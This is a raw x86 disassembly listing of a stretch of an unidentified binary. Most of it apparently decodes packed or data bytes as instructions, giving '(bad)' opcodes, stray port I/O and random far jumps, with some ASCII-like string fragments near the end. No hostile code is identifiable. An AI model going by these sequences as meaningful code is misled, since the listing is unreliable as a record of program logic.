  41f9f2:	xchg   BYTE PTR ds:0x216c5a,bh
  41f9f8:	ret    0xd262
  41f9fb:	push   esi
  41f9fc:	in     al,dx
	...
  41fa09:	add    BYTE PTR [eax],al
  41fa0b:	(bad)  
  41fa0d:	test   eax,0xddffeef7
  41fa13:	and    al,0x1
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	sbb    DWORD PTR [eax-0x591cd8f7],edi
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	stos   BYTE PTR es:[edi],al
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    BYTE PTR [edi-0x56b7e59a],cl
  41fa28:	pop    ebp
  41fa29:	mov    ds:0x8993cc88,eax
  41fa2e:	push   ss
  41fa2f:	ficomp DWORD PTR [ecx-0x47]
  41fa32:	add    ch,0xec
  41fa35:	and    DWORD PTR [eax-0x4458d688],0xe09a1f7b
  41fa3f:	scas   al,BYTE PTR es:[edi]
  41fa40:	sub    ebp,ebx
  41fa42:	jae    0x41fa4a
  41fa44:	test   al,0xd6
  41fa46:	push   edi
  41fa47:	sbb    al,0xee
  41fa49:	in     eax,0x1e
  41fa4b:	sub    al,0x65
  41fa4d:	lock inc edi
  41fa4f:	cmp    eax,DWORD PTR [eax]
  41fa51:	jmp    0xbb8e39eb
  41fa56:	clc    
  41fa57:	ja     0x41face
  41fa59:	mov    esi,0x2ba6067f
  41fa5e:	cmp    ecx,DWORD PTR [edx]
  41fa60:	xor    eax,0x2f78e3b5
  41fa65:	loop   0x41faa8
  41fa67:	ret    
  41fa68:	int    0xfa
  41fa6a:	xlat   BYTE PTR ds:[ebx]
  41fa6b:	shl    DWORD PTR [edx],0xcc
  41fa6e:	lods   al,BYTE PTR ds:[esi]
  41fa6f:	fcomp  QWORD PTR [edi+0x2a]
  41fa72:	fsub   DWORD PTR [esi-0x6e]
  41fa75:	mov    ebp,0x97a7101
  41fa7a:	dec    esp
  41fa7b:	mov    ch,BYTE PTR [esi-0x13]
  41fa7e:	pop    ecx
  41fa7f:	into   
  41fa80:	pusha  
  41fa81:	pop    ebp
  41fa82:	xor    al,0x3a
  41fa84:	lods   eax,DWORD PTR ds:[esi]
  41fa85:	test   BYTE PTR [ecx+0x76],bh
  41fa88:	sbb    al,0x27
  41fa8a:	mov    bl,0x59
  41fa8c:	mov    esi,0x2a631c9c
  41fa91:	arpl   WORD PTR [edx-0x150198f0],dx
  41fa97:	xchg   ecx,eax
  41fa98:	cmp    eax,0xae8c8fc2
  41fa9d:	int3   
  41fa9e:	push   edx
  41fa9f:	sbb    al,0x0
  41faa1:	push   0x6e
  41faa3:	paddusb mm7,QWORD PTR [edx+ecx*4-0x6]
  41faa8:	push   ebp
  41faa9:	out    0x71,al
  41faab:	retf   0xf8d7
  41faae:	mov    WORD PTR [esi-0x1058439d],fs
  41fab4:	cmp    DWORD PTR ds:0xe692bdc4,esi
  41faba:	addr16 (bad) 
  41fabc:	dec    ecx
  41fabd:	lods   al,BYTE PTR ds:[esi]
  41fabe:	fidiv  DWORD PTR [eax-0x16]
  41fac1:	ins    BYTE PTR es:[edi],dx
  41fac2:	scas   eax,DWORD PTR es:[edi]
  41fac3:	js     0x41faa6
  41fac5:	pop    ecx
  41fac6:	cmp    DWORD PTR [esi+0x1e],ebx
  41fac9:	int    0xa2
  41facb:	mov    edi,0x9a
	...
  41fad8:	add    BYTE PTR [eax],al
  41fada:	add    BYTE PTR [edi-0x5e],ch
  41fadd:	aam    0x2a
  41fadf:	fnstsw WORD PTR [esi-0x1]
  41fae2:	out    0x52,eax
  41fae4:	fcmovu st,st(5)
  41fae6:	in     eax,0x98
  41fae8:	leave  
  41fae9:	mov    ds:0x1a78dee,eax
  41faee:	add    BYTE PTR [edx-0x3000000],ch
  41faf4:	lahf   
  41faf5:	inc    eax
  41faf6:	cmp    al,0xa4
  41faf8:	fidivr DWORD PTR [esi+0x28a37355]
  41fafe:	pop    edi
  41faff:	in     eax,0x9e
  41fb01:	out    dx,al
  41fb02:	mov    dh,0x4b
  41fb04:	lods   eax,DWORD PTR ds:[esi]
  41fb05:	in     al,dx
  41fb06:	test   eax,0xd537e730
  41fb0b:	jmp    0x325c:0x71d09b60
  41fb12:	(bad)  
  41fb13:	loopne 0x41fadc
  41fb15:	imul   esi,DWORD PTR [esi+0x1f735bca],0xffffff98
  41fb1c:	fimul  WORD PTR [eax-0x2ada55f6]
  41fb22:	push   es
  41fb23:	inc    eax
  41fb24:	cmc    
  41fb25:	inc    edi
  41fb26:	sbb    ch,BYTE PTR [ecx-0x64]
  41fb29:	push   0x7bb3d5ac
  41fb2e:	(bad)  
  41fb2f:	(bad)  
  41fb30:	xlat   BYTE PTR ds:[ebx]
  41fb31:	add    BYTE PTR [ecx-0x70],ah
  41fb34:	mov    BYTE PTR [edx+0x75c830d4],ah
  41fb3a:	mov    al,0x12
  41fb3c:	mov    WORD PTR ds:0x66ade38d,cs
  41fb42:	pop    edi
  41fb43:	ins    BYTE PTR es:[edi],dx
  41fb44:	arpl   WORD PTR [ecx+0xf4aa798],sp
  41fb4a:	cld    
  41fb4b:	and    ah,BYTE PTR [ebx+0x6]
  41fb4e:	xlat   BYTE PTR ds:[ebx]
  41fb4f:	test   esp,esi
  41fb51:	stos   BYTE PTR es:[edi],al
  41fb52:	mov    eax,ds:0x157601f9
  41fb57:	stc    
  41fb58:	jge    0x41fb8f
  41fb5a:	imul   eax,DWORD PTR [edi+0x482b0f1c],0xffffff89
  41fb61:	mov    al,0x67
  41fb63:	inc    edx
  41fb64:	mul    ch
  41fb66:	sub    al,0x21
  41fb68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb69:	pushf  
  41fb6a:	xor    ebx,DWORD PTR [edi-0x1f573fcc]
  41fb70:	int3   
  41fb71:	mov    edx,0x9c90ddc0
  41fb76:	hlt    
  41fb77:	dec    ebp
  41fb78:	ins    DWORD PTR es:[edi],dx
  41fb79:	add    bh,dh
  41fb7b:	(bad)  
  41fb7c:	leave  
  41fb7d:	push   edx
  41fb7e:	inc    ebp
  41fb7f:	nop
  41fb80:	or     al,0x2a
  41fb82:	pop    esp
  41fb83:	sub    eax,0x36e107c1
  41fb88:	mov    ch,0x5e
  41fb8a:	retf   0xde98
  41fb8d:	pop    ss
  41fb8e:	bswap  ecx
  41fb90:	xor    al,0xd6
  41fb92:	sub    DWORD PTR [eax+0x58],0xffffff8f
  41fb96:	pop    ds
  41fb97:	lds    edi,FWORD PTR [ebx+0x1f]
  41fb9a:	mov    dh,0x81
  41fb9c:	stos   DWORD PTR es:[edi],eax
	...
  41fba9:	add    BYTE PTR [eax],al
  41fbab:	stc    
  41fbac:	sbb    al,al
  41fbae:	inc    esi
  41fbaf:	jecxz  0x41fb8f
  41fbb1:	(bad)  
  41fbb2:	mov    edi,0xe1f1bc83
  41fbb7:	call   FWORD PTR [eax-0x57c8b0f0]
  41fbbd:	add    DWORD PTR [eax],eax
  41fbbf:	stos   BYTE PTR es:[edi],al
  41fbc0:	add    BYTE PTR [eax],al
  41fbc2:	add    BYTE PTR [ecx],cl
  41fbc4:	sbb    DWORD PTR [ebx+0x67],edi
  41fbc7:	sub    al,0xba
  41fbc9:	arpl   WORD PTR [edi],cx
  41fbcb:	push   cs
  41fbcc:	sbb    DWORD PTR [esi+ebp*2-0x711a6032],esi
  41fbd3:	out    0x2a,eax
  41fbd5:	mov    al,ds:0x6af81e75
  41fbda:	fimul  DWORD PTR ss:[esi-0x31]
  41fbde:	adc    edi,DWORD PTR [eax+0x56]
  41fbe1:	cmc    
  41fbe2:	sti    
  41fbe3:	(bad)  
  41fbe4:	jbe    0x41fc2d
  41fbe6:	imul   eax,DWORD PTR [edi+0x3d],0x25
  41fbea:	jno    0x41fbc5
  41fbec:	fs (bad) 
  41fbee:	push   eax
  41fbef:	aad    0x56
  41fbf1:	xchg   esi,eax
  41fbf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbf3:	imul   ebp,DWORD PTR [eax],0x48
  41fbf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbf7:	loope  0x41fba9
  41fbf9:	fwait
  41fbfa:	push   0xbe995c9
  41fbff:	retf   0xae90
  41fc02:	dec    esp
  41fc03:	(bad)  [edi+0x2feb8cac]
  41fc09:	imul   esp,DWORD PTR [edx],0x4401429
  41fc0f:	push   eax
  41fc10:	jbe    0x41fc09
  41fc12:	jne    0x41fc16
  41fc14:	jmp    FWORD PTR [edx]
  41fc16:	mov    esp,0xe71cb16e
  41fc1b:	cmp    ebx,ebx
  41fc1d:	add    ch,0x8
  41fc20:	push   esi
  41fc21:	in     al,dx
  41fc22:	mov    edx,0x9eedf06a
  41fc27:	out    dx,al
  41fc28:	ret    
  41fc29:	sub    bh,BYTE PTR [ecx-0x25]
  41fc2c:	out    0xe8,eax
  41fc2e:	mov    eax,0x8b75dd43
  41fc33:	pop    ds
  41fc34:	das    
  41fc35:	adc    BYTE PTR [esi],ah
  41fc37:	fiadd  WORD PTR [ebx]
  41fc39:	inc    ecx
  41fc3a:	gs aad 0xfe
  41fc3d:	imul   ebx,ebx,0xeeec99ba
  41fc43:	sub    eax,0xdf9c3232
  41fc48:	jns    0x41fc75
  41fc4a:	iret   
  41fc4b:	out    0x54,eax
  41fc4d:	push   esp
  41fc4e:	rcl    BYTE PTR [edi+0x6],cl
  41fc51:	pop    es
  41fc52:	inc    esp
  41fc53:	ret    
  41fc54:	cld    
  41fc55:	repnz in eax,dx
  41fc57:	and    al,0xa
  41fc59:	aaa    
  41fc5a:	je     0x41fc86
  41fc5c:	inc    ebp
  41fc5d:	fild   DWORD PTR [ebp+0x390544e0]
  41fc63:	inc    edi
  41fc64:	jmp    0x41fc8f
  41fc66:	fcomi  st,st(5)
  41fc68:	pop    es
  41fc69:	xor    dh,BYTE PTR cs:[edx-0x47]
	...
  41fc79:	add    BYTE PTR [eax],al
  41fc7b:	mov    eax,ds:0x3e8336b9
  41fc80:	(bad)  
  41fc81:	mov    ch,0xbb
  41fc83:	icebp  
  41fc84:	and    eax,0x762c8c27
  41fc89:	xchg   ecx,eax
  41fc8a:	push   ss
  41fc8b:	loope  0x41fc35
  41fc8d:	add    DWORD PTR [eax],eax
  41fc8f:	stos   BYTE PTR es:[edi],al
  41fc90:	add    BYTE PTR [eax],al
  41fc92:	add    BYTE PTR [eax+0x6fd83111],al
  41fc98:	push   edi
  41fc99:	mov    ecx,0x19ebafb0
  41fc9e:	mov    ch,BYTE PTR [edx]
  41fca0:	ja     0x41fcbf
  41fca2:	jne    0x41fc7c
  41fca4:	inc    esp
  41fca5:	mov    edx,0x90a8d66c
  41fcaa:	scas   al,BYTE PTR es:[edi]
  41fcab:	(bad)  
  41fcac:	fadd   DWORD PTR [eax+0x28]
  41fcaf:	inc    eax
  41fcb0:	outs   dx,DWORD PTR ds:[esi]
  41fcb1:	xchg   al,bl
  41fcb3:	xchg   esp,eax
  41fcb4:	jmp    0x8178ba17
  41fcb9:	or     dl,ch
  41fcbb:	mov    al,ds:0x557a458d
  41fcc0:	scas   al,BYTE PTR es:[edi]
  41fcc1:	mov    ebx,0x62f635ad
  41fcc6:	cdq    
  41fcc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcc8:	sub    esi,edx
  41fcca:	adc    DWORD PTR [ecx+edi*8],esi
  41fccd:	sub    bh,BYTE PTR [esi+0x8]
  41fcd0:	fnstenv [ebx+0x48]
  41fcd3:	mov    edx,0xb9f8255d
  41fcd8:	mov    ebp,DWORD PTR [esi]
  41fcda:	pop    ss
  41fcdb:	mov    dl,0xc3
  41fcdd:	(bad)  
  41fcde:	out    0xfd,eax
  41fce0:	popa   
  41fce1:	leave  
  41fce2:	jmp    0x70a0:0x8ea98f0f
  41fce9:	jle    0x41fc74
  41fceb:	idiv   BYTE PTR [ebx]
  41fced:	repnz push 0xb31a34aa
  41fcf3:	(bad)  
  41fcf5:	lods   al,BYTE PTR ds:[esi]
  41fcf6:	fbld   TBYTE PTR [ebx]
  41fcf8:	xchg   edx,eax
  41fcf9:	xchg   ebp,eax
  41fcfa:	(bad)  
  41fcfb:	mov    WORD PTR [esi+0x6],ds
  41fcfe:	lock out dx,al
  41fd00:	xchg   esi,eax
  41fd01:	aam    0x26
  41fd03:	lea    ebx,[edi]
  41fd05:	xlat   BYTE PTR ds:[ebx]
  41fd06:	daa    
  41fd07:	add    bl,ch
  41fd09:	rcl    ch,cl
  41fd0b:	in     al,dx
  41fd0c:	outs   dx,DWORD PTR ds:[esi]
  41fd0d:	pop    es
  41fd0e:	push   ss
  41fd0f:	mov    ds:0xe6af67e4,al
  41fd14:	fwait
  41fd15:	pop    ebx
  41fd16:	(bad)  
  41fd17:	out    0xfe,al
  41fd19:	push   es
  41fd1a:	repz jge 0x41fcb4
  41fd1d:	gs xchg edi,eax
  41fd1f:	mov    bl,0x5a
  41fd21:	imul   edi,DWORD PTR [ebx-0x50],0x79bb4ed8
  41fd28:	adc    al,0x5a
  41fd2a:	xchg   edx,eax
  41fd2b:	repnz outs dx,DWORD PTR ds:[esi]
  41fd2d:	add    al,0x66
  41fd2f:	ds push esi
  41fd31:	pop    es
  41fd32:	icebp  
  41fd33:	pop    edx
  41fd34:	dec    edi
  41fd35:	sub    BYTE PTR [ebp-0x15b8c2df],ah
  41fd3b:	mov    edx,0x20
	...
  41fd48:	add    BYTE PTR [eax],al
  41fd4a:	add    BYTE PTR [edx],dl
  41fd4c:	xlat   BYTE PTR ds:[ebx]
  41fd4d:	repz or esi,edi
  41fd50:	das    
  41fd51:	cli    
  41fd52:	fist   WORD PTR [ecx]
  41fd54:	dec    ebx
  41fd55:	es nop
  41fd57:	mov    ch,BYTE PTR ds:0xa98b424f
  41fd5d:	add    DWORD PTR [eax],eax
  41fd5f:	stos   BYTE PTR es:[edi],al
  41fd60:	add    BYTE PTR [eax],al
  41fd62:	add    BYTE PTR [eax-0x80],ah
  41fd65:	pop    es
  41fd66:	sbb    DWORD PTR [ebp-0x111a2a57],esp
  41fd6c:	clc    
  41fd6d:	adc    al,0x5f
  41fd6f:	cld    
  41fd70:	mov    ch,0x96
  41fd72:	mov    ebp,0xcf4c9ef5
  41fd77:	mov    ebx,0x7ff0cc81
  41fd7c:	mov    ds:0xc98f9546,eax
  41fd81:	inc    esi
  41fd82:	out    0x53,al
  41fd84:	mov    edx,0xa9544f89
  41fd89:	pop    ds
  41fd8a:	popa   
  41fd8b:	jae    0x41fd88
  41fd8d:	popa   
  41fd8e:	cld    
  41fd8f:	add    ebp,DWORD PTR [edx+0x5e907ad4]
  41fd95:	sbb    dh,BYTE PTR [ecx+0x22]
  41fd98:	jne    0x41fdf0
  41fd9a:	mov    ch,0x90
  41fd9c:	jo     0x41fd85
  41fd9e:	mov    esp,0xc44b5062
  41fda3:	mov    dl,BYTE PTR [eax+0x7b]
  41fda6:	cdq    
  41fda7:	lods   al,BYTE PTR ds:[esi]
  41fda8:	push   ss
  41fda9:	pop    ecx
  41fdaa:	lahf   
  41fdab:	xchg   edx,eax
  41fdac:	jmp    0x4db5:0x59a76888
  41fdb3:	out    dx,al
  41fdb4:	into   
  41fdb5:	test   eax,0xb5b15603
  41fdba:	jno    0x41fda9
  41fdbc:	jb     0x41fda5
  41fdbe:	mov    ds:0x481a8153,al
  41fdc3:	pop    ebp
  41fdc4:	mov    ah,0x9c
  41fdc6:	addr16 inc edi
  41fdc8:	push   ss
  41fdc9:	jne    0x41fdaa
  41fdcb:	add    eax,0x19b97ff
  41fdd0:	jnp    0x41fe0f
  41fdd2:	push   edx
  41fdd3:	fnstcw WORD PTR [edi+0x6]
  41fdd6:	mov    dl,0x56
  41fdd8:	mov    al,ds:0xdea3133a
  41fddd:	scas   al,BYTE PTR es:[edi]
  41fdde:	mov    cl,0x37
  41fde0:	and    al,BYTE PTR [esi]
  41fde2:	push   0xa8bed8b
  41fde7:	inc    ebp
  41fde8:	fisub  DWORD PTR [esi+0x22]
  41fdeb:	(bad)  
  41fdec:	lea    esi,ds:0xe68a865
  41fdf2:	leave  
  41fdf3:	aam    0x86
  41fdf5:	(bad)  
  41fdf6:	xlat   BYTE PTR ds:[ebx]
  41fdf7:	ficomp DWORD PTR [edx+0x6f39e61c]
  41fdfd:	out    0xd8,eax
  41fdff:	(bad)  [eax-0x32a36d3]
  41fe05:	test   BYTE PTR [esp+eax*1],ch
  41fe08:	xor    BYTE PTR [esi],dh
  41fe0a:	(bad)  
  41fe0b:	cmp    BYTE PTR [ebx],bh
	...
  41fe19:	add    BYTE PTR [eax],al
  41fe1b:	adc    bh,BYTE PTR [edx-0x19073928]
  41fe21:	push   ds
  41fe22:	(bad)  
  41fe23:	adc    bl,dh
  41fe25:	cwde   
  41fe26:	out    dx,al
  41fe27:	cwde   
  41fe28:	add    DWORD PTR [ebx],esp
  41fe2a:	or     eax,0x1aa35
  41fe2f:	stos   BYTE PTR es:[edi],al
  41fe30:	add    BYTE PTR [eax],al
  41fe32:	add    al,dh
  41fe34:	imul   ecx,DWORD PTR [ecx-0x7b202b73],0xebde801a
  41fe3e:	bound  edx,QWORD PTR [eax]
  41fe40:	imul   esi,DWORD PTR [eax-0x80],0x51
  41fe44:	mov    esp,0xc3c4fbce
  41fe49:	adc    ecx,DWORD PTR [eax-0x3191d14d]
  41fe4f:	jae    0x41fe5b
  41fe51:	test   eax,0x6d9fb6c1
  41fe56:	add    DWORD PTR [edx],esi
  41fe58:	pop    ebx
  41fe59:	ret    0x3dee
  41fe5c:	xor    al,bh
  41fe5e:	push   ebx
  41fe5f:	jl     0x41fe72
  41fe61:	dec    edx
  41fe62:	jns    0x41fe64
  41fe64:	adc    eax,0x6e8482fc
  41fe69:	scas   al,BYTE PTR es:[edi]
  41fe6a:	sti    
  41fe6b:	mov    edx,edx
  41fe6d:	jle    0x41fe53
  41fe6f:	sbb    DWORD PTR [esi+0x7d],eax
  41fe72:	das    
  41fe73:	xor    DWORD PTR [esi+0x65],ecx
  41fe76:	sub    dh,BYTE PTR [ecx-0x7c5084f5]
  41fe7c:	fdiv   st(5),st
  41fe7e:	pop    esp
  41fe7f:	out    dx,al
  41fe80:	imul   edi,DWORD PTR [esi-0x741d6e],0xffffffc6
  41fe87:	inc    esi
  41fe88:	(bad)  
  41fe89:	stos   DWORD PTR es:[edi],eax
  41fe8a:	out    dx,eax
  41fe8b:	dec    ebx
  41fe8c:	hlt    
  41fe8d:	out    0x4e,al
  41fe8f:	xor    BYTE PTR ds:[ebp+0xa9cead1],ah
  41fe96:	scas   al,BYTE PTR es:[edi]
  41fe97:	stos   DWORD PTR es:[edi],eax
  41fe98:	outs   dx,BYTE PTR ds:[esi]
  41fe99:	push   es
  41fe9a:	xchg   esp,eax
  41fe9b:	(bad)  
  41fe9c:	outs   dx,BYTE PTR ds:[esi]
  41fe9d:	add    bh,ah
  41fe9f:	fsubr  DWORD PTR [ecx+0x694596a9]
  41fea5:	dec    esi
  41fea6:	xchg   ebx,eax
  41fea7:	mov    ch,0xe8
  41fea9:	jecxz  0x41ff29
  41feab:	test   DWORD PTR [ebx+0x35],0x98e13c72
  41feb2:	dec    ebx
  41feb3:	pop    esp
  41feb4:	sub    DWORD PTR [edi],ebp
  41feb6:	out    dx,eax
  41feb7:	lahf   
  41feb8:	add    DWORD PTR [esi+eiz*2-0x7f535e99],eax
  41febf:	in     eax,0x1
  41fec1:	mov    WORD PTR [eax-0x8],?
  41fec4:	pop    esp
  41fec5:	jg     0x41ff1f
  41fec7:	mov    ebp,0xbecb4d29
  41fecc:	mov    edx,0xa761df14
  41fed1:	iret   
  41fed2:	and    al,0x76
  41fed4:	add    eax,0x5bb31074
  41fed9:	xlat   BYTE PTR ds:[ebx]
  41feda:	fadd   QWORD PTR ds:0xc9
	...
  41feec:	nop
  41feed:	inc    edx
  41feee:	add    BYTE PTR [eax+edx*4],al
  41fef1:	inc    edx
  41fef2:	add    BYTE PTR [eax],cl
  41fef4:	nop
  41fef5:	inc    edx
  41fef6:	add    BYTE PTR [eax+edx*4],cl
  41fef9:	inc    edx
  41fefa:	add    BYTE PTR [eax],dl
  41fefc:	nop
  41fefd:	inc    edx
  41fefe:	add    BYTE PTR [eax+edx*4],dl
  41ff01:	inc    edx
  41ff02:	add    BYTE PTR [eax],bl
  41ff04:	nop
  41ff05:	inc    edx
  41ff06:	add    BYTE PTR [eax+edx*4],bl
  41ff09:	inc    edx
  41ff0a:	add    BYTE PTR [esi+0x49],cl
  41ff0d:	dec    esi
  41ff0e:	pop    edi
  41ff0f:	pop    edx
  41ff10:	dec    edx
  41ff11:	inc    ecx
  41ff12:	xor    eax,DWORD PTR [eax]
  41ff14:	push   ebx
  41ff15:	push   edi
  41ff16:	inc    edi
  41ff17:	cmp    DWORD PTR [edi+0x41],ebx
  41ff1a:	pop    eax
  41ff1b:	ss push esi
  41ff1d:	pop    ecx
  41ff1e:	add    BYTE PTR [ebx+0x43],dl
  41ff21:	inc    ebp
  41ff22:	pop    edi
  41ff23:	inc    ecx
  41ff24:	pop    eax
  41ff25:	push   edi
  41ff26:	dec    eax
  41ff27:	inc    edx
  41ff28:	pop    edi
  41ff29:	cmp    DWORD PTR [ecx+0x4d],ecx
  41ff2c:	dec    ecx
  41ff2d:	add    BYTE PTR [ecx+0x46],al
  41ff30:	cmp    DWORD PTR [edx],esi
  41ff32:	xor    ebx,DWORD PTR [edi+0x32]
  41ff35:	aaa    
  41ff36:	inc    esp
  41ff37:	inc    esp
  41ff38:	pop    edi
  41ff39:	xor    eax,0x41545800
  41ff3e:	pop    edi
  41ff3f:	push   ecx
  41ff40:	push   esp
  41ff41:	inc    esi
  41ff42:	push   ebp
  41ff43:	cmp    DWORD PTR [eax],eax
  41ff45:	push   edi
  41ff46:	push   ebp
  41ff47:	inc    ecx
  41ff48:	xor    dh,BYTE PTR [ebx]
  41ff4a:	xor    ebx,DWORD PTR [edi+0x4e]
  41ff4d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  41ff51:	cmp    DWORD PTR [edi+0x38],ebx
  41ff54:	dec    ecx
  41ff55:	cmp    DWORD PTR [edx+0x36],ebx
  41ff58:	pop    edi
  41ff59:	dec    edx
  41ff5a:	xor    BYTE PTR [edx+0x34],cl
  41ff5d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  41ff61:	xor    esi,DWORD PTR [eax]
  41ff63:	pop    edi
  41ff64:	inc    edx
  41ff65:	dec    ebx
  41ff66:	pop    eax
  41ff67:	pop    eax
  41ff68:	xor    eax,0x51414d00
  41ff6d:	pop    edi
  41ff6e:	inc    ecx
  41ff6f:	xor    al,BYTE PTR [ebp+0x5f]
  41ff72:	inc    ecx
  41ff73:	dec    ebx
  41ff74:	cmp    DWORD PTR ds:0x5a003939,esi
  41ff7a:	inc    ebp
  41ff7b:	cmp    BYTE PTR [edi+0x4d],bl
  41ff7e:	ss dec eax
  41ff80:	dec    ebx
  41ff81:	add    BYTE PTR [ebp+0x57],al
  41ff84:	xor    DWORD PTR [edi+0x31],ebx
  41ff87:	dec    ebx
  41ff88:	xor    eax,DWORD PTR [ecx+0x30]
  41ff8b:	push   ebx
  41ff8c:	add    BYTE PTR [edx+esi*1+0x36],al
  41ff90:	aaa    
  41ff91:	pop    edi
  41ff92:	push   edx
  41ff93:	dec    eax
  41ff94:	dec    ebp
  41ff95:	cmp    BYTE PTR [edi+0x37],bl
  41ff98:	inc    esi
  41ff99:	xor    eax,0x35005500
  41ff9e:	add    BYTE PTR [ebx+0x0],al
  41ffa1:	pop    edi
  41ffa2:	add    BYTE PTR [ecx+0x0],bl
  41ffa5:	dec    ecx
  41ffa6:	add    BYTE PTR [ebx+0x0],dl
  41ffa9:	xor    al,BYTE PTR [eax]
  41ffab:	pop    edi
  41ffac:	add    BYTE PTR [edx+0x0],dl
  41ffaf:	add    BYTE PTR [eax],al
  41ffb1:	push   eax
  41ffb2:	add    BYTE PTR [ebp+0x0],dl
  41ffb5:	dec    ecx
  41ffb6:	add    BYTE PTR [eax],dh
  41ffb8:	add    BYTE PTR [edi+0x0],bl
  41ffbb:	inc    ebx
  41ffbc:	add    BYTE PTR [esi],dh
  41ffbe:	add    BYTE PTR [ebp+0x0],al
  41ffc1:	xor    al,BYTE PTR [eax]
  41ffc3:	pop    edi
  41ffc4:	add    BYTE PTR [ebp+0x0],cl
  41ffc7:	xor    al,0x0
  41ffc9:	dec    edx
  41ffca:	add    BYTE PTR [edx+0x0],dl
  41ffcd:	push   ebp
  41ffce:	add    BYTE PTR [eax],al
  41ffd0:	add    BYTE PTR [esi+0x0],cl
  41ffd3:	cmp    DWORD PTR [eax],eax
  41ffd5:	push   eax
  41ffd6:	add    BYTE PTR [edi+0x0],bl
  41ffd9:	push   ebp
  41ffda:	add    BYTE PTR [ecx],bh
  41ffdc:	add    BYTE PTR [esi],dh
  41ffde:	add    BYTE PTR [eax],dh
  41ffe0:	add    BYTE PTR [ecx],dh
  41ffe2:	add    BYTE PTR [edi+0x0],bl
  41ffe5:	dec    edi
  41ffe6:	add    BYTE PTR [esi+0x0],cl
  41ffe9:	push   esp
  41ffea:	add    BYTE PTR [eax],bh
  41ffec:	add    BYTE PTR [eax],al
  41ffee:	add    BYTE PTR [eax+eax*1+0x34],cl
  41fff2:	add    BYTE PTR [eax+eax*1+0x31],al
  41fff6:	add    BYTE PTR [edi+0x0],bl
  41fff9:	dec    ebx
  41fffa:	add    BYTE PTR [ecx],dh
  41fffc:	add    BYTE PTR [ebp+0x0],al
  41ffff:	pop    edi
  420000:	add    BYTE PTR [edx+0x0],bl
  420003:	add    BYTE PTR [eax],al
  420005:	push   esp
  420006:	add    BYTE PTR [edi],dh
  420008:	add    BYTE PTR [ebx+0x0],al
  42000b:	pop    edi
  42000c:	add    BYTE PTR [edx+0x0],al
  42000f:	xor    al,BYTE PTR [eax]
  420011:	xor    DWORD PTR [eax],eax
  420013:	push   ebx
  420014:	add    BYTE PTR [ecx],dh
  420016:	add    BYTE PTR [ecx],bh
  420018:	add    BYTE PTR [edx+0x0],al
  42001b:	add    BYTE PTR [eax],al
  42001d:	inc    edi
  42001e:	add    BYTE PTR [ebp+0x0],al
  420021:	xor    al,0x0
  420023:	cmp    BYTE PTR [eax],al
  420025:	add    BYTE PTR [eax],al
  420027:	add    BYTE PTR [eax+0x42],dl
  42002a:	add    BYTE PTR [eax+edx*2],al
  42002d:	inc    edx
  42002e:	add    BYTE PTR [eax],cl
  420030:	push   eax
  420031:	inc    edx
  420032:	add    BYTE PTR [eax+edx*2],cl
  420035:	inc    edx
  420036:	add    BYTE PTR [eax],dl
  420038:	push   eax
  420039:	inc    edx
  42003a:	add    BYTE PTR [eax+edx*2],dl
  42003d:	inc    edx
  42003e:	add    BYTE PTR [eax],bl
  420040:	push   eax
  420041:	inc    edx
  420042:	add    BYTE PTR [eax+edx*2],bl
  420045:	inc    edx
  420046:	add    BYTE PTR [eax],ah
  420048:	push   eax
  420049:	inc    edx
  42004a:	add    BYTE PTR [eax+edx*2],ah
  42004d:	inc    edx
  42004e:	add    BYTE PTR [eax],ch
  420050:	push   eax
  420051:	inc    edx
	...
  420062:	add    BYTE PTR [eax],al
  420064:	call   0x0:0x4d3ef2
  42006b:	add    BYTE PTR [edx+0x1000200],dl
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [ecx],al
  420075:	add    BYTE PTR [eax],al
  420077:	add    BYTE PTR [ecx],al
  420079:	add    BYTE PTR [eax],al
  42007b:	add    BYTE PTR [eax-0x73fffe00],cl
  420081:	add    BYTE PTR [edx],al
  420083:	add    BYTE PTR [eax-0x23fffe00],dl
  420089:	cmp    al,0x0
  42008b:	add    BYTE PTR [esi+0x200],bl
  420091:	add    BYTE PTR [edi+0x6f],dl
  420094:	jb     0x4200fa
  420096:	push   edi
  420097:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42009e:	aas    
  42009f:	inc    ebx
  4200a0:	ins    BYTE PTR es:[edi],dx
  4200a1:	outs   dx,DWORD PTR ds:[esi]
  4200a2:	jae    0x420109
  4200a4:	push   edi
  4200a5:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  4200ac:	popa   
  4200ad:	je     0x420118
  4200af:	outs   dx,DWORD PTR ds:[esi]
  4200b0:	outs   dx,BYTE PTR ds:[esi]
  4200b1:	inc    ebx
  4200b2:	ins    BYTE PTR es:[edi],dx
  4200b3:	outs   dx,DWORD PTR ds:[esi]
  4200b4:	jae    0x42011b
  4200b6:	push   edi
  4200b7:	imul   eax,DWORD PTR [eax],0x0
	...
